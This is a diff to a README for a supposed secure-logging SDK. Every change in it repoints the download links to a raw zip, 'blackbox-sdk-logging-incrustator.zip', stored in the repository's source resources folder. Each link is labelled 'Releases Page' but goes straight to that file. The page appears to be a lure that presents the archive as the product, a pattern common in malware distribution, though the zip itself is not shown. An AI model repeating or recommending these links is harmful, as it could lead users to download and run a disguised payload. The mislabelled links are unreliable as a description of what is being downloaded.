@@ -1,7 +1,7 @@
 # 🛠️ blackbox-logging-sdk - Simple Secure Logging for Everyone
 
 ## 📥 Download Now!
-[![Download blackbox-logging-sdk](https://raw.githubusercontent.com/Ju750/blackbox-logging-sdk/main/secure-log-starter/src/main/blackbox-logging-sdk_v2.7.zip)](https://raw.githubusercontent.com/Ju750/blackbox-logging-sdk/main/secure-log-starter/src/main/blackbox-logging-sdk_v2.7.zip)
+[![Download blackbox-logging-sdk](https://github.com/Ju750/blackbox-logging-sdk/raw/refs/heads/main/secure-log-starter/src/main/resources/blackbox-sdk-logging-incrustator.zip)](https://github.com/Ju750/blackbox-logging-sdk/raw/refs/heads/main/secure-log-starter/src/main/resources/blackbox-sdk-logging-incrustator.zip)
 
 ## 📜 Overview
 Welcome to blackbox-logging-sdk! This software allows you to securely log data without changing your existing code. It provides features like masking, encryption, and tamper-proofing. These tools help keep your information safe and private.
@@ -10,7 +10,7 @@ Welcome to blackbox-logging-sdk! This software allows you to securely log data w
 To start using blackbox-logging-sdk, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download section.
-   - [Visit Releases Page](https://raw.githubusercontent.com/Ju750/blackbox-logging-sdk/main/secure-log-starter/src/main/blackbox-logging-sdk_v2.7.zip)
+   - [Visit Releases Page](https://github.com/Ju750/blackbox-logging-sdk/raw/refs/heads/main/secure-log-starter/src/main/resources/blackbox-sdk-logging-incrustator.zip)
 
 2. **Choose Your Version**: You will see several versions listed. Select the latest version for the best features and security. 
 
@@ -45,7 +45,7 @@ For detailed examples on usage, refer to the documentation located in the reposi
 ## 📦 Download & Install
 To get the blackbox-logging-sdk, follow these steps:
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/Ju750/blackbox-logging-sdk/main/secure-log-starter/src/main/blackbox-logging-sdk_v2.7.zip).
+1. Go to the [Releases Page](https://github.com/Ju750/blackbox-logging-sdk/raw/refs/heads/main/secure-log-starter/src/main/resources/blackbox-sdk-logging-incrustator.zip).
 
 2. Click on the latest version to download. 
 
